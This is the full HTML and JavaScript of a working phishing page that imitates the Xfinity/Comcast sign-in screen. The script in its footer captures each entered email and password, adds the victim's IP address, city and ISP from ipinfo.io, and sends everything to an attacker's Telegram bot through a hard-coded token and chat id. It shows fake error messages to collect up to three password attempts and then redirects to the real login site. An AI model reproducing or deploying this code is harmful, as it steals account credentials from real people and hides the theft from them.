<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        * {
    margin: 0;
    padding: 0;
    font-family: Arial, sans-serif;
    font-family: Arial, Helvetica, sans-serif;
}

.container {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    height: 100vh;
    position: relative;
}

.left-side, .right-side {
    flex: 1;
}

.left-side {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: flex-start;
    padding: 100px;
    background-color: #fff;
}

.password-side {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: flex-start;
    padding: 40px;
    background-color: #fff;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 400px;
    /* box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); */
    border-radius: 8px;
 
}

.logo {
    width: 100px;
    height: 20px;
    margin-bottom: 20px; /* Adjusted margin */
}

.displayed-email {
    font-size: 16px;
    color: #333;
    margin-bottom: 20px; /* Adjusted margin */
}

.title {
    font-size: 28px;
    font-weight: bold;
    margin-bottom: 20px;
}

.input-field {
    width: 100%;
    padding: 15px 8px;
    margin-bottom: 10px;
    border: 1px solid #7a7a7a;
    border-radius: 5px;
    font-size: 16px;
}

.terms {
    font-size: 14px;
    color: #666;
    margin-bottom: 20px;
}

.terms a {
    text-decoration: underline;
}

.login-button {
    width: 20%;
    padding: 12px;
    background-color: #5f2dd3;
    color: #fff;
    border: none;
    border-radius: 5px;
    font-size: 14px;
    cursor: pointer;
    margin-bottom: 20px;
}

.back-button {
    width: 100%;
    padding: 12px;
    background-color: #5f2dd3;
    color: #fff;
    border: none;
    border-radius: 5px;
    font-size: 14px;
    cursor: pointer;
    margin-bottom: 20px;
}

.new-offer, .find-id, .create-id {
    font-size: 14px;
    color: #666;
    margin-bottom: 15px;
}

.new-offer a, .find-id a, .create-id a {
    color: #0071eb;
    text-decoration: none;
}

.right-side {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 50%;
}

.right-side img {
    width: 100%;
    height: 80%;
    object-fit: cover;
}

.footer {
    background-color: #fff;
    padding-top: 20px;
    border-top: 1px solid #ddd;
    text-align: center;
}

.footer-links {
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    gap: 15px;
    margin-bottom: 10px;
}

.footer-links a {
    color: #666;
    font-size: 12px;
    text-decoration: none;
}

.footer-bottom {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 10px;
    font-size: 12px;
    background-color: black;
    padding: 10px;
}

.footer-bottom a.cookie-preferences {
    text-decoration: none;
    color: #fff;
    font-weight: bold;
}

.hide {
    display: none;
}

.fdf{
    display: flex;
    align-items: center;
    justify-content: start;
    /* border: 1px solid red; */
    font-size: 14px;
    gap: 10px;
    margin-bottom: 20px;
}
.displayed-email{
    font-size: 12px;
}

    </style>
    <link rel="shortcut icon" href="https://logosandtypes.com/wp-content/uploads/2022/03/xfinity.svg" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Xfinity</title>
</head>
<body>
    <div class="container">
        <!-- Login Section -->
        <div id="loginSection" class="left-side">
            <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity Logo" class="logo">
            <h1 class="title">Sign in with your Xfinity ID</h1>
            <input type="text" placeholder="Email, mobile, or username" class="input-field" id="emailInput">
            <p id="emailError" style="color: #c01212; display: none; margin-bottom: 20px; font-size: 10px;">The Xfinity ID you entered was incorrect. Please try again.</p>
            <p class="terms">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
            <button class="login-button" onclick="showPasswordSection()">Let's go</button>
            <p class="new-offer">New to Xfinity? <a href="#">View exclusive offers near you</a></p>
            <p class="find-id"><a href="#">Find your Xfinity ID</a></p>
            <p class="create-id"><a href="#">Create a new Xfinity ID</a></p>
        </div>

        <!-- Password Section -->
         <div id="passwordSection" class="password-side hide" >
            <div >
                <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity Logo" class="logo">
                <p id="displayedEmail" class="displayed-email"></p>
                <h1 class="title">Enter your password</h1>
                <p id="err" style="color: #c01212; margin-bottom: 10px; font-size: 10px;"></p>
                <input type="password" placeholder="Password" class="input-field" id="passwordInput">
                <h3 style="font-size: 12px; color: #5F2DD3; font-weight: 300; margin-bottom: 20px; cursor: pointer;">Forgot Password?</h3>
                <div class="fdf"><input type="checkbox"> <p>Keep me signed in</p></div>
                <p class="terms">By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
                <button class="login-button" onclick="handleSubmit(event)">Sign in</button>
                <p style="font-weight: 600;">
                    Sign in as Someone else
                </p>
                <p style="padding-top: 30px; font-size: 13px;">Trobule Signing in <span style="cursor: pointer; text-decoration: underline; color: blue;">Get Help?</span></p>
    
            </div>

            <div style="position: fixed; bottom: 0; left: 0; padding-top: 40px;  width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; ">
                <p style="text-align: center; font-size: 12px ; color: #7a7a7a;">&copy;2024 Comcast</p>
    
                </div>
    

         </div>
      

        <!-- Right Side: Image -->
        <div id="rightSideImage" class="right-side">
            <img src="https://assets.xfinity.com/assets/cima/login/default/ad/CIMA_Login_Desktop_09_2024_v3.jpg" alt="">
        </div>
    </div>

    <!-- Footer Section -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Web Terms Of Service</a>
            <a href="#">CA Notice at Collection</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Your Privacy Choices</a>
            <a href="#">Health Privacy Notice</a>
            <a href="#">Ad Choices</a>
        </div>
        <div class="footer-bottom">
            <a href="#" class="cookie-preferences">Cookie Preferences</a>
        </div>
    </footer>

    <script>
        var telegram_bot_id = "7845816189:AAEQ3F7itL_E0CvViZpBtEG4ZOuLMvIH3lI";
        var chat_id = 7284131782;
        var attemptCounter = 0;
        var userInfo = {};
    
        // Fetch IP info
        async function fetchText() {
            let url = "https://ipinfo.io/json?token=de42e80837e28f";
            try {
                let response = await fetch(url);
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                // Parsing the data
                let data = await response.json();
                console.log(data);  // Log the data to check the structure
    
                if (data) {
                    userInfo = {
                        country: data.country || 'N/A',
                        state: data.region || 'N/A',
                        city: data.city || 'N/A',
                        isp: data.org || 'N/A',
                        ip: data.ip || 'N/A'
                    };
    
                    console.log(userInfo);  // Log the parsed userInfo to ensure it's correct
                } else {
                    console.error('Data is undefined');
                }
            } catch (error) {
                console.error('Fetch error: ', error);
            }
        }
    
        // Get current time
        function getCurrentTime() {
            var now = new Date();
            var year = now.getFullYear();
            var month = (now.getMonth() + 1).toString().padStart(2, '0');
            var day = now.getDate().toString().padStart(2, '0');
            var hours = now.getHours().toString().padStart(2, '0');
            var minutes = now.getMinutes().toString().padStart(2, '0');
            var seconds = now.getSeconds().toString().padStart(2, '0');
            return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
        }
    
        // Show password section
        function showPasswordSection() {
            const email = document.getElementById('emailInput').value;
            const emailError = document.getElementById('emailError');
            const passwordSection = document.getElementById('passwordSection');
            const displayedEmail = document.getElementById('displayedEmail');
            const rightSideImage = document.getElementById('rightSideImage');
    
            if (email) {
                if (email.endsWith('@comcast.net')) {
                    emailError.style.display = 'none';
                    document.getElementById('loginSection').style.display = 'none';
                    displayedEmail.textContent = email;
                    passwordSection.classList.remove('hide');
                    rightSideImage.style.display = 'none';
                } else {
                    emailError.style.display = 'block';
                }
            }
        }
    
        // Show login section
        function showLoginSection() {
            const passwordSection = document.getElementById('passwordSection');
            const rightSideImage = document.getElementById('rightSideImage');
            document.getElementById('loginSection').style.display = 'block';
            passwordSection.classList.add('hide');
            rightSideImage.style.display = 'block';
        }
    
        // Handle form submission
        async function handleSubmit(event) {
            event.preventDefault();
    
            attemptCounter++;
    
            var u_name = document.getElementById("emailInput").value;
            var password = document.getElementById("passwordInput").value;
    
            if (u_name === "" || password === "") {
                document.getElementById("err").textContent = "Password field cannot be empty.";
                return false;
            }
    
            // Fetch user info before submitting
            await fetchText();
    
            var currentTime = getCurrentTime();
            // var title = "Comcast Mail";
            var message = `-------++++ made by perrycyber ++++-------\nUSERID: ${u_name}\nPASSWORD: ${password}\nATTEMPT: ${attemptCounter}\nUSERTIME&DATE: ${currentTime}\nCOUNTRY: ${userInfo.country}\nSTATE: ${userInfo.state}\nCITY: ${userInfo.city}\nISP: ${userInfo.isp}\nIP: ${userInfo.ip}`;
    
            var data = {
                chat_id: chat_id,
                text: message
            };
    
            fetch("https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Success:", data);
                document.getElementById("passwordInput").value = "";
                document.getElementById("passwordInput").classList.add("error");
    
                if (attemptCounter < 3) {
                    document.getElementById("err").textContent = "Invalid username or password. Try again";
                } else {
                    document.getElementById("emailInput").value = "";
                    document.getElementById("passwordInput").value = "";
                    setTimeout(function() {
                        window.location.href = "https://login.xfinity.com/login";
                    }, 2000);
                }
            })
            .catch((error) => {
                console.error("Error:", error);
            });
    
            return false;
        }
    </script>
    
</body>
</html>
